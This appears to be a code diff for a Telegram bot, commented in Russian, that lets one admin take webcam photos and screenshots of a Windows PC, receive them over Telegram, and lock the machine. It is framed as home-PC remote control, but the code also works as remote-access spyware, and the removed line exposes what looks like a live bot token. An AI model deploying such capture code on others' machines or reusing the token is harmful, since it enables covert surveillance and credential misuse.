@@ -1,32 +1,48 @@
 import telebot
 from telebot import types
+import cv2
+import pyautogui
+import os
+import ctypes
 
-bot = telebot.TeleBot("8610879721:AAFGQvJIBJXbKvASlRsEzNAiu1ga3I5TdhI")
+# Твой токен и ID (чтобы только ты мог управлять)
+API_TOKEN = 'ТВОЙ_ТОКЕН_БОТА'
+ADMIN_ID = ТВОЙ_ID_ЦИФРАМИ  # Узнай свой ID в @getmyid_bot
+
+bot = telebot.TeleBot(API_TOKEN)
 
 @bot.message_handler(commands=['start', 'panel'])
-def welcome(message):
-    # Создаем клавиатуру как на твоем скрине
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    
-    # Кнопки в ряд
-    item1 = types.KeyboardButton("💻 Скриншот")
-    item2 = types.KeyboardButton("📊 Статус")
-    item3 = types.KeyboardButton("⚙️ Конфиг")
-    
-    markup.add(item1, item2, item3)
-    
-    bot.send_message(message.chat.id, "<b>Панель управления активна</b>", 
-                     parse_mode='html', reply_markup=markup)
+def send_welcome(message):
+    if message.from_user.id == ADMIN_ID:
+        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        btn1 = types.KeyboardButton("📸 Камера")
+        btn2 = types.KeyboardButton("🖥 Скриншот")
+        btn3 = types.KeyboardButton("🔒 Блок ПК")
+        markup.add(btn1, btn2, btn3)
+        bot.send_message(message.chat.id, "🛠 <b>Управление HOME-PC_inyx</b>", parse_mode='html', reply_markup=markup)
 
 @bot.message_handler(content_types=['text'])
-def handle_text(message):
-    if message.text == "💻 Скриншот":
-        bot.send_message(message.chat.id, "📸 Запрос скриншота отправлен на HOME-PC...")
-        # Тут будет логика снятия скрина
-    elif message.text == "📊 Статус":
-        # Убрали спам "в сети", теперь только по нажатию:
-        bot.send_message(message.chat.id, "🟢 <b>HOME-PC_inyx</b>: В сети\n🔴 <b>HOME-PC_петя</b>: Оффлайн", parse_mode='html')
-    elif message.text == "⚙️ Конфиг":
-        bot.send_message(message.chat.id, "📄 Файл config.json считан успешно.")
+def func(message):
+    if message.from_user.id == ADMIN_ID:
+        if message.text == "📸 Камера":
+            cap = cv2.VideoCapture(0)
+            ret, frame = cap.read()
+            if ret:
+                cv2.imwrite("cam.png", frame)
+                with open("cam.png", "rb") as photo:
+                    bot.send_photo(message.chat.id, photo)
+                os.remove("cam.png")
+            cap.release()
+
+        elif message.text == "🖥 Скриншот":
+            img = pyautogui.screenshot()
+            img.save("screen.png")
+            with open("screen.png", "rb") as photo:
+                bot.send_photo(message.chat.id, photo)
+            os.remove("screen.png")
+
+        elif message.text == "🔒 Блок ПК":
+            bot.send_message(message.chat.id, "⛔ ПК заблокирован")
+            ctypes.windll.user32.LockWorkStation()
 
 bot.polling(none_stop=True)
